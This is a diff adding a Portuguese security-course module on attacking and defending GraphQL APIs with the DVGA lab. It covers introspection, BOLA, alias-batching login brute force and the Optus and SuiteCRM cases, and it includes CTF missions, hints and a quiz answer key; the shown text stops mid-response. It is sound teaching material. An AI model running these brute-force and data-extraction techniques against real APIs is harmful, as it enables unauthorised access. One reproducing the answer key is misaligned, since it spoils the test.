@@ -1,0 +1,861 @@
+---
+slug: seguranca-de-apis-e-graphql
+track: trilha-4
+title: "Segurança de APIs e GraphQL"
+prerequisites: [autenticacao-e-sessoes, controle-de-acesso-e-idor, criptografia-assimetrica-e-tls]
+lab: dvga
+tasks:
+  - slug: missao-1-dados-privados
+    title: "Missão 1 — O schema inteiro e os dados que a tela esconde"
+    type: flag
+    prompt: "Use a introspection para descobrir como pedir os pastes privados que a interface não lista e leia-os pela API. A flag é FLAG{quantidade-dono}, onde quantidade é o número de pastes privados que a API expõe e dono é o name do owner desses pastes."
+    hint: "A interface só mostra pastes públicos. Peça o schema com uma introspection query e procure, na query pastes, o argumento public. Depois peça pastes(public:false) incluindo o campo owner{name}. Conte quantos vieram e leia o nome do dono."
+    flag:
+      hash: "scrypt$16384$8$1$2c4d64033ebf85ccbcf30347eeaad67d7683aad8d333ecc7d81053926b4760e7"
+      salt: "0f636acf8e310d6f55f89960da511178"
+  - slug: missao-2-batching-login
+    title: "Missão 2 — Uma requisição, muitas senhas (batching)"
+    type: flag
+    prompt: "Quebre o login do admin tentando várias senhas de uma lista numa ÚNICA requisição GraphQL (usando aliases). O alias que acertar devolve um accessToken (um JWT). A flag é FLAG{identity-senha}, onde identity é o campo identity de dentro do token e senha é a senha que você recuperou."
+    hint: "Monte uma mutation com vários aliases (a:, b:, c:...), cada um chamando login(username, password) com uma senha diferente e pedindo accessToken. O alias que não falhar traz o token. Separe o JWT por pontos, decodifique a segunda parte (Base64url) e leia o campo identity."
+    flag:
+      hash: "scrypt$16384$8$1$f5a17112f3b39badff1bc5202cc950d9a88827ed6332d6e7a9b0e126ef3ceb9a"
+      salt: "4693d71816d8bdcbc5402b95818884ea"
+  - slug: quiz-final
+    title: "Quiz — Segurança de APIs e GraphQL"
+    type: quiz
+    passPercent: 70
+    questions:
+      - question: "Por que a maioria das falhas graves de API é de autorização, e não de injeção?"
+        options:
+          - "Porque APIs não aceitam entrada do usuário"
+          - "Porque a API recebe um identificador (um id, um campo) e o servidor devolve ou altera o objeto correspondente sem checar, por requisição, se o chamador pode acessá-lo. A identidade pode estar certa; a decisão de acesso é que falta"
+          - "Porque APIs usam sempre HTTPS"
+          - "Porque injeção só existe em páginas HTML"
+        answer: 1
+        explanation: "O risco nº 1 do OWASP API Security Top 10 é BOLA (Broken Object Level Authorization): o endpoint confia no id que o cliente manda. É o IDOR do 4.5 no vocabulário de APIs. A injeção existe, mas a autorização quebrada é a campeã porque é fácil esquecer a checagem em algum dos muitos endpoints/campos."
+      - question: "O que a introspection de GraphQL entrega a quem pergunta?"
+        options:
+          - "Os dados de todos os usuários"
+          - "O schema inteiro da API: todos os tipos, campos e argumentos — ou seja, o mapa completo da superfície de ataque, incluindo operações que a interface nunca mostra"
+          - "A senha do administrador"
+          - "O código-fonte do servidor"
+        answer: 1
+        explanation: "A introspection é um recurso legítimo do GraphQL (o que alimenta ferramentas e autocompletar). Para o atacante, é um presente: uma única query devolve tipos, campos e argumentos. Na DVGA foi assim que você descobriu o argumento public da query pastes."
+      - question: "Desligar a introspection em produção resolve o problema de exposição do schema?"
+        options:
+          - "Sim, totalmente: sem introspection não há como descobrir o schema"
+          - "Ajuda, mas não basta: o atacante ainda infere campos por força bruta e pela dica de erro 'Did you mean...?' (field suggestion), e a introspection nunca foi a falha real — a falta de autorização sim"
+          - "Não faz diferença nenhuma"
+          - "Só resolve se a API usar HTTP em vez de HTTPS"
+        answer: 1
+        explanation: "Desligar a introspection é defesa em profundidade, não a cura. O CVE-2023-47643 do SuiteCRM (introspection sem autenticação) recebeu nota BAIXA justamente porque o schema por si só é só o mapa; o estrago vem da autorização ausente. E, mesmo desligada, a dica de digitação (field suggestion) continua vazando nomes de campos."
+      - question: "Na Missão 2, por que mandar várias tentativas de senha numa única requisição (batching com aliases) é um problema de segurança?"
+        options:
+          - "Porque deixa a requisição mais lenta"
+          - "Porque um limite de taxa (rate limit) que conta REQUISIÇÕES não enxerga o ataque: dezenas de tentativas cabem num POST só, derrotando a proteção e multiplicando a força bruta"
+          - "Porque aliases não são permitidos em GraphQL"
+          - "Porque o servidor rejeita qualquer requisição com mais de um campo"
+        answer: 1
+        explanation: "É o API4:2023 (Unrestricted Resource Consumption). Aliases e batching deixam uma requisição carregar muitas operações. Se a defesa só conta requisições por IP, ela conta '1' enquanto o atacante faz 50 logins. A defesa correta limita por CUSTO/quantidade de operações, não só por nº de requisições."
+      - question: "A DVGA tem uma query systemDiagnostics que roda um comando do sistema. Que risco de API isso ilustra?"
+        options:
+          - "Nenhum, é um recurso normal"
+          - "Que um resolver pode fazer muito mais que ler um campo — pode executar comando ou buscar URLs (SSRF). A API é só a porta; a autorização e a validação de cada resolver é que contêm o estrago"
+          - "Que GraphQL é sempre seguro"
+          - "Que o problema é só o HTML da página"
+        answer: 1
+        explanation: "Resolvers são código: um deles roda comando (systemDiagnostics), outro busca uma URL escolhida pelo cliente (importPaste → SSRF, o API7). Isso mostra por que autenticar o endpoint não basta — cada resolver precisa validar entrada e checar permissão. No lab, esses efeitos ficam presos no contêiner isolado."
+      - question: "Qual conjunto de defesas ataca a RAIZ dos problemas vistos no módulo?"
+        options:
+          - "Só desligar a introspection"
+          - "Autorização por objeto e por função em CADA resolver (deny by default), limite por custo/profundidade das queries, e não confiar em identificadores vindos do cliente como prova de posse"
+          - "Trocar os ids sequenciais por UUID e pronto"
+          - "Esconder as operações perigosas na interface"
+        answer: 1
+        explanation: "A raiz é a autorização ausente no nível do objeto/função e a falta de limite de consumo. A cura mora no servidor, em cada resolver: checar posse e papel, negar por padrão, limitar custo/profundidade e amount. UUID, esconder na UI e desligar introspection são camadas — nunca a cura."
+glossary:
+  - term: GraphQL
+    definition: "GraphQL: linguagem de consulta para APIs em que o cliente descreve, numa única requisição a um único endpoint, exatamente quais campos quer receber. O servidor responde com esses campos e nada mais. Alternativa ao estilo REST (muitos endpoints, um por recurso)."
+  - term: GraphQL schema
+    definition: "Schema (do GraphQL): o contrato da API — a lista de todos os tipos, campos e argumentos que ela expõe, e como se relacionam. É o mapa de tudo o que se pode pedir; descobri-lo é o primeiro passo de quem ataca uma API GraphQL."
+  - term: GraphQL resolver
+    definition: "Resolver: a função do servidor que, para cada campo pedido numa query GraphQL, vai buscar (ou calcular) o valor na fonte de dados. Como é código, um resolver pode ler um banco, chamar outra API, rodar um comando — e é nele que a autorização de cada campo precisa ser imposta."
+  - term: introspection
+    definition: "Introspection: recurso do GraphQL que permite perguntar ao próprio servidor qual é o seu schema (tipos, campos, argumentos). Útil para ferramentas, mas, para o atacante, entrega o mapa completo da API numa só query. Costuma vir ligada por padrão."
+  - term: query batching
+    definition: "Query batching (empacotamento de consultas): mandar várias operações GraphQL numa única requisição. Legítimo para eficiência, mas abusado para derrotar limites de taxa que contam requisições e para multiplicar ataques de força bruta."
+  - term: GraphQL alias
+    definition: "Alias (em GraphQL): um apelido que permite chamar o mesmo campo várias vezes na mesma query, cada vez com argumentos diferentes (a:login(...), b:login(...)). É o mecanismo que torna o batching possível dentro de uma única operação."
+  - term: OWASP API Security Top 10
+    definition: "OWASP API Security Top 10: lista das dez principais classes de risco específicas de APIs, mantida pela OWASP (edição de 2023). Encabeçada por BOLA (autorização de objeto quebrada), ela complementa o OWASP Top 10 geral com o que é próprio de APIs."
+  - term: excessive data exposure
+    definition: "Excessive data exposure (exposição excessiva de dados): quando a API devolve mais campos do que o cliente precisa, confiando que a interface vai filtrar. Como o atacante fala direto com a API, ele lê os campos sensíveis que a tela esconderia. Em 2023 virou parte do risco API3 (autorização no nível de propriedade)."
+  - term: unrestricted resource consumption
+    definition: "Unrestricted Resource Consumption (consumo irrestrito de recursos): o risco API4:2023 — a API não limita quanto trabalho uma requisição pode custar (sem rate limit por custo, sem limite de profundidade, sem paginação). Permite negação de serviço e força bruta barata, como no batching."
+  - term: query depth limiting
+    definition: "Query depth limiting (limite de profundidade): defesa que recusa queries GraphQL aninhadas demais (objeto dentro de objeto dentro de objeto...), que de outro modo poderiam explodir em trabalho e derrubar o servidor."
+  - term: query cost analysis
+    definition: "Query cost analysis (análise de custo): atribuir um 'preço' a cada campo/tipo e rejeitar a query cujo custo total passe de um teto. Limita o consumo por CUSTO da operação, não por número de requisições — a defesa certa contra batching e queries pesadas."
+  - term: persisted query
+    definition: "Persisted query (consulta persistida): técnica em que o servidor só aceita queries previamente cadastradas (identificadas por um hash), em vez de qualquer query arbitrária do cliente. Reduz muito a superfície: o atacante não consegue montar consultas novas."
+  - term: field suggestion
+    definition: "Field suggestion (sugestão de campo): o comportamento do GraphQL de, diante de um campo digitado errado, responder 'Did you mean...?' com nomes parecidos. Mesmo com a introspection desligada, isso vaza nomes de campos do schema aos poucos."
+  - term: improper inventory management
+    definition: "Improper Inventory Management (gestão de inventário inadequada): o risco API9:2023 — perder o controle de quais APIs e versões estão no ar. Endpoints antigos, de teste ou esquecidos (as 'shadow' e 'zombie' APIs) continuam acessíveis e desatualizados, como a API dormente do caso Optus."
+---
+
+import restVsGraphql from "./img/rest-vs-graphql.svg";
+import fluxoIntrospectionBola from "./img/fluxo-introspection-bola.svg";
+
+## 1. Abertura — o que você vai aprender e por quê
+
+Quase tudo o que um aplicativo faz hoje passa por uma **API** (Application
+Programming Interface — a "porta de serviço" pela qual um programa fala com
+outro, trocando dados em vez de páginas prontas). O seu banco no celular, o
+mapa, a loja: a tela é só a vitrine; por trás, uma API entrega os dados. E foi
+para lá que o ataque se mudou. Em 2022, a operadora australiana Optus perdeu os
+dados de mais de **9,5 milhões** de clientes por causa de **uma** API esquecida,
+sem autenticação — você verá o caso na seção 4. Não houve exploit sofisticado:
+havia uma porta de dados aberta que ninguém estava vigiando.
+
+Nos módulos anteriores você quebrou a <GlossaryTerm term="broken authentication">autenticação</GlossaryTerm>
+(4.4) e o <GlossaryTerm term="broken access control">controle de acesso</GlossaryTerm>
+(4.5) de aplicações web. Agora olhamos a mesma classe de falhas pela lente das
+**APIs** — e, em particular, de uma tecnologia que mudou como elas funcionam: o
+<GlossaryTerm term="GraphQL">GraphQL</GlossaryTerm>. Em vez de dezenas de
+endereços (um por recurso), o GraphQL expõe **um** endpoint por onde o cliente
+pede exatamente os campos que quer. Isso é poderoso — e concentra num só lugar
+uma superfície de ataque enorme, muitas vezes mal protegida.
+
+Você vai atacar, no laboratório, a **DVGA** (Damn Vulnerable GraphQL
+Application): vai pedir o schema inteiro da API com uma
+<GlossaryTerm term="introspection">introspection</GlossaryTerm> query, ler dados
+privados que a interface esconde e quebrar o login do admin mandando dezenas de
+senhas numa **única** requisição. Depois vai aprender a fechar cada uma dessas
+portas.
+
+**Ao final, você vai saber:**
+
+- explicar por que a maioria das falhas de API é de **autorização**, não de
+  injeção, e como o <GlossaryTerm term="OWASP API Security Top 10">OWASP API
+  Security Top 10</GlossaryTerm> organiza esses riscos;
+- usar a **introspection** para mapear uma API GraphQL e alcançar operações que a
+  interface nunca mostra;
+- explorar <GlossaryTerm term="excessive data exposure">exposição excessiva de
+  dados</GlossaryTerm> e <GlossaryTerm term="BOLA">BOLA</GlossaryTerm> numa API
+  real, e quebrar um login com <GlossaryTerm term="query batching">batching</GlossaryTerm>
+  e <GlossaryTerm term="GraphQL alias">aliases</GlossaryTerm>, derrotando o limite
+  de taxa;
+- reconhecer o mesmo problema numa API **REST** (retomando o Juice Shop do 4.5);
+- defender uma API: autorização em cada <GlossaryTerm term="GraphQL resolver">resolver</GlossaryTerm>,
+  limite por <GlossaryTerm term="query cost analysis">custo</GlossaryTerm> e
+  <GlossaryTerm term="query depth limiting">profundidade</GlossaryTerm>, e por que
+  desligar a introspection ajuda mas não basta.
+
+**Pré-requisitos relembrados:**
+
+- **4.4 (Autenticação e sessões quebradas):** vamos reusar <GlossaryTerm term="rate limiting">rate
+  limiting</GlossaryTerm> (limite de taxa) e a ideia de força bruta de senha.
+- **4.5 (Broken Access Control e IDOR):** BOLA é literalmente o IDOR das APIs;
+  <GlossaryTerm term="mass assignment">mass assignment</GlossaryTerm> e
+  <GlossaryTerm term="function-level access control">controle no nível de
+  função</GlossaryTerm> voltam aqui.
+- **3.4 (Criptografia assimétrica e TLS):** o token que você vai roubar é um
+  <GlossaryTerm term="JWT">JWT</GlossaryTerm>; vamos decodificá-lo.
+
+**Tempo estimado:** 3 a 4 horas, incluindo o laboratório.
+
+<Callout variant="ethics">
+Tudo aqui é feito **exclusivamente** contra o laboratório local `dvga`, que
+existe para ser atacado. Rodar uma introspection query, ler dados ou forçar um
+login numa API real sem autorização por escrito é acesso não autorizado a sistema
+— crime no Brasil (art. 154-A do Código Penal, visto no 1.4). A técnica é a mesma;
+o que muda é a autorização.
+</Callout>
+
+## 2. Teoria aprofundada — o conceito por dentro
+
+### 2.1 O que é uma API, e por que o ataque se mudou para lá
+
+Uma página web antiga era um documento pronto: o servidor montava o HTML com os
+dados já dentro e mandava tudo. Hoje o normal é diferente: o servidor manda um
+programa (a <GlossaryTerm term="SPA">SPA</GlossaryTerm>, do 4.5) que roda no seu
+navegador ou celular, e esse programa busca os **dados** separadamente, por uma
+**API** — trocando JSON, não HTML. A tela é só apresentação; os dados vêm crus da
+API.
+
+Isso tem uma consequência central para a segurança, e ela é a espinha deste
+módulo: **o atacante fala com a API diretamente, ignorando a sua interface**.
+Qualquer regra que exista só no cliente — esconder um botão, filtrar um campo,
+limitar o que a tela mostra — é decoração. O que protege é o que o **servidor**
+faz quando a requisição chega. É o mesmo princípio do 4.5, agora com um alvo que
+foi **feito** para ser consumido por programas.
+
+### 2.2 REST e GraphQL: muitos endpoints contra um só
+
+Há dois grandes estilos de API, e a diferença muda onde a defesa precisa estar.
+
+No estilo **REST** (<GlossaryTerm term="REST API">REST API</GlossaryTerm>, que
+você viu no 2.5), cada recurso tem o seu próprio endereço: `GET /users/25`,
+`GET /baskets/6`, `DELETE /orders/42`. Para pegar o perfil, o carrinho e os
+pedidos de alguém, o cliente faz **três** chamadas a **três** endpoints. Cada
+endpoint é um ponto onde o servidor precisa checar a autorização — e se um
+esquecer, só aquele recurso vaza.
+
+No **GraphQL**, há **um** endpoint (quase sempre `/graphql`). O cliente manda uma
+*query* que descreve exatamente os campos que quer, de quantos recursos quiser, e
+recebe tudo numa resposta só:
+
+```text
+POST /graphql
+query {
+  user(id: 25) {
+    name
+    basket { total }
+    orders { id date }
+  }
+}
+```
+
+Quem atende isso no servidor são os <GlossaryTerm term="GraphQL resolver">resolvers</GlossaryTerm>:
+uma função por campo, que vai buscar aquele dado na sua fonte. `user` tem um
+resolver, `basket` tem outro, `orders` tem outro. O
+<GlossaryTerm term="GraphQL schema">schema</GlossaryTerm> é o contrato que lista
+todos os tipos e campos disponíveis.
+
+<Figure
+  src={restVsGraphql}
+  alt="Comparação entre REST e GraphQL. À esquerda, REST: o cliente chama vários endpoints separados (GET barra users barra 25, GET barra baskets barra 6, GET barra orders barra 42), e cada endpoint é um ponto que precisa checar a autorização. À direita, GraphQL: o cliente manda uma query para um único endpoint POST barra graphql, que consulta o schema e distribui o trabalho a vários resolvers, um por campo, cada um buscando o dado numa fonte. Uma faixa embaixo resume a lição: em REST a autorização mora em cada endpoint; em GraphQL ela precisa morar em cada resolver, porque um só endpoint esconde dezenas de operações e uma query pode tocar muitos objetos. Autenticar o endpoint não basta; cada campo resolvido decide se o chamador pode vê-lo. Abaixo, uma observação em amarelo: o erro recorrente das APIs não é injeção, é autorização — o servidor confia no id que o cliente manda e devolve o objeto sem conferir de quem ele é (BOLA/IDOR), o risco número 1 do OWASP API Security Top 10."
+  caption="REST espalha a autorização por muitos endpoints; GraphQL a concentra num só endpoint, mas a empurra para dentro de cada resolver. Em ambos, o pecado capital é devolver objetos sem checar de quem são."
+/>
+
+A diferença prática: num GraphQL, autenticar o endpoint `/graphql` (exigir estar
+logado para falar com ele) **não** protege quase nada, porque uma única query
+autenticada pode pedir objetos que não são seus, em lote. A autorização tem de
+descer para **cada resolver**.
+
+### 2.3 O pecado capital das APIs é a autorização, não a injeção
+
+Quando você pensa em "falha web", talvez pense em injeção (SQL injection, XSS).
+Em APIs, a campeã é outra: a **autorização quebrada**. A OWASP mantém uma lista
+própria para isso, o <GlossaryTerm term="OWASP API Security Top 10">OWASP API
+Security Top 10</GlossaryTerm> (edição de 2023), e o risco **número 1** é o
+<GlossaryTerm term="BOLA">BOLA</GlossaryTerm> (Broken Object Level Authorization)
+— que você já conhece com outro nome: é o **IDOR** do 4.5. O endpoint recebe o id
+de um objeto e o devolve sem conferir se o chamador pode vê-lo.
+
+Por que a autorização falha mais em API do que em site tradicional? Porque a API
+tem **muito mais** pontos de decisão (cada endpoint REST, cada resolver GraphQL,
+cada campo), e porque ela devolve **dados crus**, confiando que "a interface vai
+cuidar disso". Dois riscos da lista de 2023 captam esse padrão:
+
+- **API3 — autorização no nível de propriedade.** Inclui a
+  <GlossaryTerm term="excessive data exposure">exposição excessiva de dados</GlossaryTerm>:
+  a API devolve o objeto inteiro (com `ipAddr`, `isAdmin`, `passwordHash`...)
+  porque o desenvolvedor pensou só na tela, que mostra um ou dois campos. O
+  atacante lê tudo. Inclui também o <GlossaryTerm term="mass assignment">mass
+  assignment</GlossaryTerm> do 4.5 (o cliente **escreve** um campo que não devia).
+- **API4 — <GlossaryTerm term="unrestricted resource consumption">Unrestricted
+  Resource Consumption</GlossaryTerm>.** A API não limita quanto uma requisição
+  pode custar. Sem <GlossaryTerm term="rate limiting">rate limiting</GlossaryTerm>
+  por custo, um atacante faz força bruta barata ou derruba o serviço — e o GraphQL
+  dá uma arma a mais para isso, como veremos.
+
+Outros riscos que vamos tocar: **API2** (Broken Authentication, o 4.4),
+**API5** (<GlossaryTerm term="function-level access control">Broken Function
+Level Authorization</GlossaryTerm>, o BFLA do 4.5), **API7** (<GlossaryTerm term="SSRF">SSRF</GlossaryTerm>,
+o 4.7) e **API9** (<GlossaryTerm term="improper inventory management">Improper
+Inventory Management</GlossaryTerm> — o caso Optus).
+
+### 2.4 Introspection: o GraphQL que te entrega o mapa
+
+Aqui está a característica do GraphQL que todo atacante adora. Para que
+ferramentas de desenvolvimento funcionem (autocompletar, documentação,
+exploradores de API), o GraphQL oferece a **introspection**: você pode perguntar
+ao próprio servidor "quais tipos, campos e argumentos você tem?" — e ele responde
+com o <GlossaryTerm term="GraphQL schema">schema</GlossaryTerm> inteiro.
+
+Para o desenvolvedor, é conveniência. Para o atacante, é o mapa completo da
+superfície de ataque, de graça, numa query só. Em vez de adivinhar endpoints
+(como no `ffuf` do 2.3), ele **pede** a lista de tudo. É assim que você vai
+começar o laboratório.
+
+Um ponto que derruba muita gente, e volta na defesa: **desligar a introspection
+não esconde o schema de verdade**. Mesmo desligada, o GraphQL costuma responder a
+um campo digitado errado com *"Did you mean...?"* — o
+<GlossaryTerm term="field suggestion">field suggestion</GlossaryTerm> — e isso
+vaza nomes de campos aos poucos. E, mais importante: a introspection **nunca foi a
+falha**; ela só revela a porta. Se a porta estiver trancada (autorização em cada
+resolver), saber que ela existe não adianta.
+
+### 2.5 Batching e aliases: uma requisição que vale por mil
+
+O GraphQL deixa você pedir o mesmo campo várias vezes na mesma query, cada vez com
+argumentos diferentes, dando a cada um um apelido — o
+<GlossaryTerm term="GraphQL alias">alias</GlossaryTerm>. E deixa empacotar várias
+operações numa requisição só — o <GlossaryTerm term="query batching">batching</GlossaryTerm>.
+
+Isso é ótimo para eficiência. Mas pense no que acontece com um
+<GlossaryTerm term="rate limiting">rate limit</GlossaryTerm> que conta
+**requisições** por IP: se o atacante põe 50 tentativas de login numa requisição
+só, o limite conta "1" enquanto ele faz 50. O batching **derrota** a defesa mais
+comum contra força bruta. É a cara do risco API4 (consumo irrestrito), e é
+exatamente a sua Missão 2.
+
+## 3. Como o ataque funciona — a mecânica
+
+Vamos ver a mecânica em requisições concretas, do tipo que você vai mandar no
+lab. Todas vão para o mesmo endpoint, `POST /graphql`, com o corpo em JSON no
+campo `query`.
+
+### 3.1 Passo 1 — pedir o schema (introspection)
+
+O schema se pede com uma query especial, que começa em `__schema` (os campos que
+começam com dois sublinhados são os da introspection). A forma mínima lista os
+nomes dos tipos:
+
+```text
+query {
+  __schema {
+    queryType { name }
+    types { name kind }
+  }
+}
+```
+
+A forma completa (que as ferramentas usam) desce em cada tipo e lista os campos e
+**argumentos** de cada um. É olhando os argumentos que você acha ouro: uma query
+`pastes(public: Boolean)` grita "me peça com `public: false` e veja o que a
+interface esconde".
+
+### 3.2 Passo 2 — usar o que o mapa revelou (BOLA e exposição de dados)
+
+De posse do schema, o atacante chama operações que a interface nunca ofereceu.
+Dois padrões:
+
+- **Trocar/forjar o identificador (BOLA):** `paste(id: 2)` devolve o objeto `2`
+  sem checar o dono — o IDOR do 4.5, agora num resolver GraphQL.
+- **Pedir o filtro que a UI não usa (exposição de dados):** `pastes(public: false)`
+  lista os privados; e, como o GraphQL deixa você escolher os campos, você pede
+  `content`, `ipAddr`, `owner { name }` — campos que a tela do dono veria, mas que
+  a sua não deveria.
+
+<Figure
+  src={fluxoIntrospectionBola}
+  alt="Fluxo do ataque contra a API GraphQL da DVGA em quatro passos. Passo um: o atacante manda uma introspection query ao endpoint barra graphql e recebe o schema inteiro, com a query pastes e seu argumento public. Passo dois: conhecendo o schema, pede pastes com public igual a falso, ou paste por id, operações que a interface web nunca oferece porque só mostra pastes públicos. Passo três: o servidor devolve os pastes privados, incluindo campos sensíveis como content, ipAddr e o dono, que a interface esconde — exposição excessiva de dados e autorização de objeto quebrada, porque nenhum resolver conferiu a posse. À direita, em paralelo, o passo do batching: num único POST barra graphql, aliases a, b e c tentam várias senhas de login de uma vez; limites de taxa que contam requisições não enxergam o ataque, e o alias que acerta devolve um token JWT com identity admin. Uma faixa final resume a raiz: um endpoint só, muitas operações, autorização que precisa estar em cada resolver, e que desligar a introspection não basta porque o field suggestion ainda vaza o schema."
+  caption="O caminho completo: a introspection entrega o mapa, o atacante pede as operações que a UI esconde (BOLA + exposição de dados), e o batching com aliases quebra o login por baixo do limite de taxa."
+/>
+
+### 3.3 Passo 3 — abusar do poder dos resolvers
+
+Um resolver é **código**, e pode fazer muito mais que ler um campo. Na DVGA, um
+resolver (`systemDiagnostics`) roda um comando do sistema operacional; outro
+(`importPaste`) busca uma URL escolhida pelo cliente — um <GlossaryTerm term="SSRF">SSRF</GlossaryTerm>
+(Server-Side Request Forgery) do 4.7, agora disparado por uma mutation GraphQL.
+Isso mostra por que "autenticar o endpoint" é tão insuficiente: cada resolver é
+uma minifunção que precisa validar a entrada e checar permissão.
+
+### 3.4 O mesmo problema em REST (retomando o Juice Shop do 4.5)
+
+Nada disso é exclusivo do GraphQL. No 4.5, contra a **API REST** do Juice Shop,
+você fez exatamente o mesmo em espírito: `GET /rest/basket/1` devolveu o carrinho
+de outra pessoa (BOLA), e `POST /api/Users` com um campo `role: admin` a mais foi
+mass assignment. A diferença é só a forma: em REST, você troca o id na URL e testa
+cada verbo (`GET`, `PUT`, `DELETE`) de cada endpoint; em GraphQL, você lê o schema
+e pede os campos. O defeito — devolver/alterar objetos sem checar de quem são — é
+idêntico. Por isso este módulo **não** sobe um segundo lab: a parte REST você já
+atacou no 4.5; aqui aprofundamos o que é próprio das APIs e do GraphQL.
+
+## 4. Casos reais — o que aconteceu no mundo
+
+### Optus: 9,5 milhões de clientes por uma API esquecida (setembro de 2022)
+
+Em **22 de setembro de 2022**, a operadora de telecomunicações australiana Optus
+anunciou publicamente que fora alvo de um ataque cibernético. A investigação do
+regulador, a **ACMA** (Australian Communications and Media Authority), reconstruiu
+o que houve e processou a Optus na Justiça Federal. Segundo a ACMA, o ataque
+ocorreu entre **17 e 20 de setembro de 2022** e expôs dados de **mais de 9,5
+milhões** de clientes atuais e antigos.
+
+A causa não foi um exploit sofisticado: foi uma **API exposta à internet, sem
+autenticação**. Essa API fora criada para que clientes acessassem informações pelo
+site; um **erro de código em 2018** desligou os controles de acesso dela. A Optus
+chegou a corrigir o erro no domínio principal em **agosto de 2021**, mas **não**
+percebeu que o mesmo erro afetava um **subdomínio** — e, quando a API ficou
+exposta à internet em 2020, aquela porta continuou aberta. Um atacante
+simplesmente mandou requisições a essa API, sem credencial, e colheu nome, data de
+nascimento, endereço, telefone e, para cerca de **2,1 milhões** de pessoas,
+números de documentos (carteira de motorista e passaporte).
+
+- **Impacto:** vazamento de dados de ~9,5 milhões de pessoas (cerca de um terço da
+  população australiana), com processo do regulador por falha em proteger a
+  informação dos clientes.
+- **Lição:** é o cruzamento de dois riscos do OWASP API Security Top 10 —
+  autenticação/autorização ausente (API1/API2) e
+  <GlossaryTerm term="improper inventory management">gestão de inventário
+  inadequada</GlossaryTerm> (API9): uma API "dormente", esquecida e desatualizada,
+  continuou no ar. Você não defende o que não sabe que existe.
+- **Fonte primária:** [ACMA — statement on 2022 Optus data breach](https://www.acma.gov.au/acma-statement-2022-optus-data-breach).
+
+### SuiteCRM: introspection aberta, mas severidade BAIXA (CVE-2023-47643)
+
+Um contraponto que ensina tanto quanto o Optus. Em **21 de novembro de 2023**,
+publicou-se o **CVE-2023-47643**: o SuiteCRM (um CRM de código aberto), em versões
+anteriores à **8.4.2**, deixava a **introspection do GraphQL ligada sem exigir
+autenticação**, expondo o schema inteiro — inclusive campos sensíveis como o
+`UserHash`. Correção: atualizar para a 8.4.2.
+
+O detalhe didático está na **nota**: a CVSS v3.1 desse CVE é **3.1 — BAIXA**. Por
+que tão baixa, se "expõe o schema todo"? Porque o schema, sozinho, é só o **mapa**
+— não é o estrago. Ele facilita os próximos passos, mas, se a autorização de cada
+resolver estiver no lugar, saber o mapa não abre nenhuma porta. É a prova, com nota
+oficial, do que dizemos na teoria: **a introspection não é a falha; a autorização
+ausente é**. Desligá-la é higiene, não cura.
+
+- **Impacto:** exposição do schema (superfície de ataque) de instalações
+  desatualizadas do SuiteCRM; severidade baixa justamente por ser só o mapa.
+- **Lição:** trate a introspection aberta como um alerta de higiene, não como a
+  emergência — e nunca confie nela como a sua única proteção.
+- **Fonte primária:** [CVE-2023-47643 no NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-47643) e o [advisory GHSA-fxww-jqfv-9rrr do SuiteCRM-Core](https://github.com/salesagility/SuiteCRM-Core/security/advisories/GHSA-fxww-jqfv-9rrr).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá (1) mapeado uma API GraphQL inteira com uma
+introspection query e lido, pela API, dados privados que a interface esconde
+(exposição excessiva de dados + BOLA); e (2) quebrado o login do administrador
+mandando várias senhas numa **única** requisição, com aliases (batching),
+derrotando o limite de taxa. Cada missão rende uma flag.
+
+O laboratório é o **`dvga`**: o Kali e a **DVGA** (Damn Vulnerable GraphQL
+Application), uma aplicação de *pastes* (trechos de texto colados, no estilo
+Pastebin) deliberadamente vulnerável, de Dolev Farhi e Nick Aleks. De dentro do
+Kali, o alvo responde em `http://dvga:5013/`, e a API GraphQL fica em
+`http://dvga:5013/graphql`. Você trabalha pelo terminal do Kali, com `curl` e
+`python3`.
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e a DVGA. Se outro lab estiver no ar, o botão vira **Trocar
+para este lab**. Alguns resolvers da DVGA (como o `systemDiagnostics`) rodam
+comandos e buscam URLs **de dentro do contêiner** — por isso o alvo fica numa rede
+interna, sem internet e sem rota para o seu PC (a troca de segurança T11, em
+`docs/LABORATORIO.md`). Nada do que a DVGA faz escapa do laboratório.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se a
+   plataforma avisar que faltam imagens, rode no terminal do WSL
+   `scripts/lab.sh pull dvga` (único momento com internet) e tente de novo. Pela
+   linha de comando, a alternativa para ligar é `scripts/lab.sh up dvga`.
+2. Quando o desktop do Kali aparecer, abra um terminal e crie a pasta de
+   evidências:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-4.9_dvga/evidencias
+$ cd ~/engajamentos/lab-4.9_dvga/evidencias
+```
+
+3. Confirme que o alvo responde e dê uma olhada na aplicação pela interface
+   (`http://dvga:5013/` no Firefox do Kali). Repare: a página inicial lista
+   **Public Pastes**. Guarde essa observação — ela é a chave da Missão 1.
+
+```console
+$ curl -s http://dvga:5013/ -o /dev/null -w "home HTTP %{http_code}\n"
+home HTTP 200
+```
+
+### 5.2 A carta de autorização do exercício
+
+<Callout variant="info" title="Autorização — exercício 4.9 (laboratório local)">
+**Ativo autorizado:** a aplicação e a API `http://dvga:5013/` do lab `dvga`.
+
+**Técnicas autorizadas:** introspection, leitura de objetos por BOLA e exposição
+de dados, e força bruta de login por batching/aliases, tudo contra a DVGA, pelo
+terminal do Kali.
+
+**Fora do escopo:** qualquer outro host (o `guacd`, o próprio Kali) e qualquer
+sistema fora do laboratório. Nada de rodar estas queries em APIs reais.
+</Callout>
+
+### 5.3 Missão 1 — O schema inteiro e os dados que a tela esconde
+
+**Cenário:** você é um visitante anônimo da DVGA. A página inicial só lista pastes
+**públicos**. Você vai provar que, falando direto com a API, lê os pastes
+**privados** que a interface nunca mostra — e campos que ela esconderia.
+
+**Seu objetivo:** descobrir **quantos** pastes privados a API expõe e o **nome do
+dono** deles. A flag é `FLAG{quantidade-dono}`.
+
+Comece pelo mapa. Peça o schema com uma introspection query (forma enxuta: os
+nomes dos tipos e, no tipo `Query`, os campos e seus argumentos):
+
+```console
+$ curl -s -X POST http://dvga:5013/graphql \
+    -H 'Content-Type: application/json' \
+    -d '{"query":"query{__schema{queryType{name} types{name kind}}}"}'
+{"data":{"__schema":{"queryType":{"name":"Query"},"types":[
+  {"name":"Query","kind":"OBJECT"},{"name":"PasteObject","kind":"OBJECT"},
